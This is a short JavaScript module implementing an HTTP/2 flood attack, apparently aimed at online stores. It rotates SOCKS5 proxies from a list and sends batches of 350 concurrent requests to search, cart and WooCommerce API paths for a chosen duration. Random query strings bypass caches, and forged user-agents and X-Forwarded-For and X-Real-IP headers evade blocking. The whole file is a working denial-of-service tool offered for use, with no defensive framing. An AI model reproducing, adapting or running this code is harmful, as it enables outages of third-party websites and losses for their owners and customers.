const http2   = require('http2-wrapper');
const { SocksProxyAgent } = require('socks-proxy-agent');
const fs      = require('fs');

const proxies = fs.readFileSync('./proxy.txt','utf8').split(/\r?\n/).filter(Boolean);
const randProxy = () => proxies[Math.floor(Math.random()*proxies.length)];
const randIP  = () => `${R(11,255)}.${R(0,255)}.${R(0,255)}.${R(2,254)}`;
const R = (min,max) => Math.floor(Math.random()*(max-min+1))+min;

function storeBeam(host, port, duration) {
  const end = Date.now() + duration*1000;
  (function run(){
    if(Date.now() > end) return;
    const agent = new SocksProxyAgent(`socks5://${randProxy()}`);
    const client = http2.connect(`https://${host}:${port}`, {agent, settings:{maxConcurrentStreams: 350}});
    for(let i=0;i<350;i++){
      const paths = ['/search?q=' + randIP(), '/cart/add?id=' + Math.floor(Math.random()*9999), '/wp-json/wc/v3/products?search=' + randIP()];
      const req = client.request({
        ':path': paths[i % paths.length],
        ':method':'GET',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12'+R(0,9)+'.0.'+R(1000,9999)+'.'+R(10,99)+' Safari/537.36',
        'x-forwarded-for': randIP(),
        'x-real-ip': randIP(),
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'cache-control': 'no-cache',
        'connection': 'keep-alive'
      });
      req.on('response', ()=> req.close());
      req.on('error', ()=>{});
      req.end();
    }
    client.close();
    setImmediate(run);
  })();
}

module.exports = { storeBeam };